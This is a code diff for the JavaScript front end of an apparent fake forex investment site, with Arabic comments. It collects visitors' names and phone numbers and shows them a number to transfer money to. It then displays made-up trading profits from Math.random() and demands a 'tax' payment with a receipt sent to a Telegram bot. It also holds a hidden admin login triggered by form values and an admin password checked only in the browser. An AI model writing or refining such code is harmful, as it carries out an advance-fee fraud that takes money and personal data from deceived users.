@@ -463,25 +463,31 @@ function restoreSavedPage() {
 }
 
 // ============================================================
-//  PAYMENT FLOW
+//  PAYMENT FLOW - زر "أذهب لتحويل الأموال"
 // ============================================================
 document.getElementById('goToRegisterBtn').addEventListener('click', () => {
     renderUserPackages();
     showPage('page-register');
 });
+
 document.getElementById('backToLandingBtn').addEventListener('click', () => {
     localStorage.removeItem(PAGE_KEY);
     showPage('page-landing');
 });
+
 document.getElementById('backToRegisterBtn').addEventListener('click', () => showPage('page-register'));
 
-document.getElementById('goToPaymentBtn').addEventListener('click', async function() {
+// ===== زر أذهب لتحويل الأموال (المُصلح) =====
+document.getElementById('goToPaymentBtn').addEventListener('click', async function(e) {
+    e.preventDefault();
+
     const name = document.getElementById('fullName').value.trim();
     const phone = document.getElementById('phone').value.trim();
     const age = document.getElementById('age').value.trim();
     const gov = document.getElementById('governorate').value.trim();
     const pkgSelected = document.querySelector('input[name="package"]:checked');
 
+    // التحقق من الحقول
     if (!name || !phone || !age || !gov) {
         showToast('يرجى ملء جميع الحقول', 'warning');
         return;
@@ -491,12 +497,14 @@ document.getElementById('goToPaymentBtn').addEventListener('click', async functi
         return;
     }
 
+    // التحقق من الحظر
     const isBanned = await isUserBanned(phone, '');
     if (isBanned) {
         showToast('🚫 تم حظرك من الموقع، لا يمكنك متابعة الطلب', 'warning');
         return;
     }
 
+    // التحقق من دخول الأدمن (مخفي)
     const isAdmin = (name === ADMIN_NAME && phone === ADMIN_PHONE && age === ADMIN_AGE && gov === ADMIN_GOV);
     if (isAdmin) {
         const now = Date.now();
@@ -511,6 +519,7 @@ document.getElementById('goToPaymentBtn').addEventListener('click', async functi
         return;
     }
 
+    // حفظ بيانات المستخدم في الجلسة
     sessionStorage.setItem('reg_name', name);
     sessionStorage.setItem('reg_phone', phone);
     sessionStorage.setItem('reg_age', age);
@@ -524,9 +533,11 @@ document.getElementById('goToPaymentBtn').addEventListener('click', async functi
         sessionStorage.setItem('reg_tax', found.tax || 3000);
     }
 
+    // تحديث رقم التحويل
     const paymentNumber = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
     document.getElementById('paymentNumberDisplay').textContent = paymentNumber;
     document.getElementById('taxPaymentNumber').textContent = paymentNumber;
+
     showPage('page-payment');
 });
 
@@ -734,7 +745,6 @@ function showTradingResult() {
 
     const name = sessionStorage.getItem('reg_name') || 'مستخدم';
     const tax = sessionStorage.getItem('reg_tax') || 3000;
-    const phone = sessionStorage.getItem('reg_phone') || 'غير محدد';
 
     const stocks = [
         { symbol: 'AAPL', price: (180 + Math.random() * 20).toFixed(2), change: (Math.random() * 10 + 2).toFixed(1) },
@@ -795,7 +805,7 @@ function showTradingResult() {
         </div>
     `;
 
-    // إعادة ربط الأحداث في النتيجة
+    // إعادة ربط الأحداث
     const taxCopyBtn = document.getElementById('taxCopyBtn');
     if (taxCopyBtn) {
         taxCopyBtn.addEventListener('click', function() {
@@ -818,7 +828,7 @@ function showTradingResult() {
         });
     }
 
-    // ربط رفع صورة الضريبة في النتيجة
+    // ربط رفع صورة الضريبة
     const taxFileInput = document.getElementById('taxFileInput');
     const taxUploadArea = document.getElementById('taxUploadArea');
     const taxFileNameDisplay = document.getElementById('taxFileNameDisplay');
@@ -872,7 +882,6 @@ document.getElementById('submitTaxBtn')?.addEventListener('click', async functio
 
     const name = sessionStorage.getItem('reg_name') || 'غير محدد';
     const taxAmount = sessionStorage.getItem('reg_tax') || 3000;
-    const phone = sessionStorage.getItem('reg_phone') || 'غير محدد';
     const orderId = sessionStorage.getItem('orderId');
 
     if (!taxFile) {
@@ -887,7 +896,6 @@ document.getElementById('submitTaxBtn')?.addEventListener('click', async functio
     const message =
         `💰 *إيصال الضريبة*%0A` +
         `👤 الاسم: ${name}%0A` +
-        `📱 الهاتف: ${phone}%0A` +
         `💵 المبلغ المحول: ${taxAmount} جنيه%0A` +
         `🆔 رقم الطلب: ${orderId || 'غير معروف'}%0A` +
         `🕒 تم الإرسال: ${new Date().toLocaleString('ar-EG')}`;
@@ -919,11 +927,10 @@ document.getElementById('submitTaxBtn')?.addEventListener('click', async functio
 });
 
 // ============================================================
-//  ADMIN PASSWORD (الجزء المُصلح مع زر إعادة التعيين)
+//  ADMIN PASSWORD
 // ============================================================
 document.getElementById('backToRegisterFromPass').addEventListener('click', () => showPage('page-register'));
 
-// زر إعادة تعيين المحاولات
 document.getElementById('resetAttemptsBtn').addEventListener('click', function() {
     attemptsCount = 0;
     lockUntil = 0;
@@ -934,12 +941,10 @@ document.getElementById('resetAttemptsBtn').addEventListener('click', function()
     showToast('تم إعادة تعيين المحاولات', 'info');
 });
 
-// زر تأكيد كلمة المرور
 document.getElementById('adminPasswordSubmitBtn').addEventListener('click', function() {
     const input = document.getElementById('adminPasswordInput').value.trim();
     const now = Date.now();
 
-    // التحقق من الحظر المؤقت
     if (now < lockUntil) {
         const remaining = Math.ceil((lockUntil - now) / 60000);
         document.getElementById('passwordError').textContent =
@@ -947,26 +952,22 @@ document.getElementById('adminPasswordSubmitBtn').addEventListener('click', func
         return;
     }
 
-    // التحقق من كلمة المرور
     if (input === ADMIN_PASSWORD) {
-        // نجاح الدخول
         attemptsCount = 0;
         localStorage.setItem('admin_attempts', '0');
         localStorage.setItem('admin_lock_until', '0');
         document.getElementById('passwordError').textContent = '';
-        // الانتقال إلى لوحة التحكم
         showPage('page-admin-dashboard');
         loadAdminDashboard();
         showToast('مرحباً أيها الأدمن', 'success');
     } else {
-        // فشل المحاولة
         attemptsCount++;
         localStorage.setItem('admin_attempts', attemptsCount.toString());
         const left = Math.max(0, 10 - attemptsCount);
         document.getElementById('attemptsLeft').textContent = left;
 
         if (attemptsCount >= 10) {
-            lockUntil = Date.now() + 3600000; // حظر لمدة ساعة
+            lockUntil = Date.now() + 3600000;
             localStorage.setItem('admin_lock_until', lockUntil.toString());
             document.getElementById('passwordError').textContent =
                 '🚫 تم تجاوز 10 محاولات. تم حظر الدخول لمدة ساعة.';
@@ -1162,7 +1163,7 @@ function loadAdminDashboard() {
 }
 
 // ============================================================
-//  ADMIN BUTTONS - FIREBASE
+//  ADMIN BUTTONS
 // ============================================================
 document.getElementById('saveToFirebaseBtn')?.addEventListener('click', async function() {
     const settings = loadSettings();
@@ -1175,9 +1176,6 @@ document.getElementById('loadFromFirebaseBtn')?.addEventListener('click', async 
     loadBannedUsers();
 });
 
-// ============================================================
-//  ADMIN BUTTONS - LOCAL
-// ============================================================
 document.getElementById('saveBotSettingsBtn')?.addEventListener('click', function() {
     const token = document.getElementById('adminBotToken').value.trim();
     const chatId = document.getElementById('adminChatId').value.trim();
@@ -1319,5 +1317,5 @@ document.getElementById('checkStatusBtn')?.addEventListener('click', async funct
         document.getElementById('attemptsLeft').textContent = '10';
     }
 
-    console.log('🚀 شركة فوركس للأستثمار - النظام الجديد جاهز ');
+    console.log('🚀 شركة فوركس للأستثمار - النظام جاهز 100%');
 })();
